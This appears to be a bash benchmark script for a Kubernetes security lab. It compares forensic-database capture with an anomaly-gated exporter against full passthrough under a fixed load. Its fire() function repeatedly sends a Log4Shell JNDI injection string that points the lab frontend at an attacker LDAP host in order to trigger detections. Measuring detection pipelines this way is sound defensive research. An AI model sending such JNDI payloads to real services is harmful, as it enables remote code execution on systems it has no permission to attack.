#!/usr/bin/env bash
# ae_vs_all.sh — AE capture-fraction A/B: FILTER (anomaly-gated) vs EVERYTHING (passthrough),
# SAME fixed load, back-to-back. Runs NODE-SIDE on the rig dev-machine (kubectl is local —
# no labctl, no tailnet). forensic_db active-part deltas (rows+bytes) per table per arm.
# capture fraction = AE/ALL. Requires live kubescape (fresh anomalies → FILTER writes flagged pods).
set -uo pipefail
NS=log4j-poc; CHPOD=chi-forensic-soc-db-soc-cluster-0-0-0
WIN=${WIN:-150}; WARM=${WARM:-60}; OUT=/tmp/ae_vs_all.txt
chq(){ kubectl -n clickhouse exec "$CHPOD" -c clickhouse -- clickhouse-client -q "$1" 2>/dev/null; }
snap(){ chq "SELECT table, sum(rows), sum(data_compressed_bytes) FROM system.parts WHERE database='forensic_db' AND active AND table IN ('http_events','dns_events','pgsql_events','conn_stats') GROUP BY table FORMAT TSV"; }
FE=$(kubectl -n $NS get svc frontend -o jsonpath='{.spec.clusterIP}' 2>/dev/null)
echo "frontend=$FE win=${WIN}s warm=${WARM}s $(date -u +%H:%M:%S)" | tee "$OUT"
for i in $(seq 1 5); do kubectl -n $NS delete pod cl-$i --ignore-not-found --wait=false >/dev/null 2>&1; done
for i in $(seq 1 5); do kubectl -n $NS run cl-$i --image=busybox:1.36 --restart=Never -- sh -c "while true; do wget -qO- http://$FE/api/products?q=l$i >/dev/null 2>&1; wget -qO- http://$FE/ >/dev/null 2>&1; sleep 0.2; done" >/dev/null 2>&1; done
fire(){ kubectl -n attacker-ns exec deploy/attacker -- sh -c 'curl -s -m3 "http://frontend.log4j-poc.svc.cluster.local/api/products?q=\${jndi:ldap://attacker-ns.svc:1389/a}" >/dev/null 2>&1' >/dev/null 2>&1 || true; }
run_arm(){ local name="$1"; shift
  echo "=== ARM $name: $* ===" | tee -a "$OUT"
  kubectl -n pl set env ds/adaptive-export "$@" >/dev/null 2>&1
  kubectl -n pl rollout status ds/adaptive-export --timeout=140s >/dev/null 2>&1
  sleep "$WARM"
  declare -A R0 B0; while IFS=$'\t' read -r t r b; do R0[$t]=$r; B0[$t]=$b; done < <(snap)
  local s0=$(date +%s) end=$(( $(date +%s) + WIN ))
  while [ "$(date +%s)" -lt "$end" ]; do fire; sleep 8; done
  echo "  window $s0..$(date +%s)" | tee -a "$OUT"
  printf "  %-14s %10s %12s\n" table d_rows d_bytes | tee -a "$OUT"
  while IFS=$'\t' read -r t r b; do printf "  %-14s %10d %12d\n" "$t" $(( r-${R0[$t]:-0} )) $(( b-${B0[$t]:-0} )) | tee -a "$OUT"; done < <(snap)
  echo "  open_windows=$(chq "SELECT countIf(t_end>now()) FROM forensic_db.adaptive_attribution")" | tee -a "$OUT"
}
run_arm ALL ADAPTIVE_PASSTHROUGH=true ADAPTIVE_PUSH_PIXIE_ROWS=false
run_arm AE  ADAPTIVE_PASSTHROUGH=false ADAPTIVE_PUSH_PIXIE_ROWS=true ADAPTIVE_WINDOW_AFTER_SEC=60 ADAPTIVE_PUSH_REFRESH_SEC=10
for i in $(seq 1 5); do kubectl -n $NS delete pod cl-$i --ignore-not-found --wait=false >/dev/null 2>&1; done
echo "DONE $(date -u +%H:%M:%S)" | tee -a "$OUT"
